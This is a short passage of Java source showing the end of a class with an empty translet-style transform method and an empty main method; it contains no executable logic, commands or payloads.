    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    public static void main(String[] args) {

    }

}
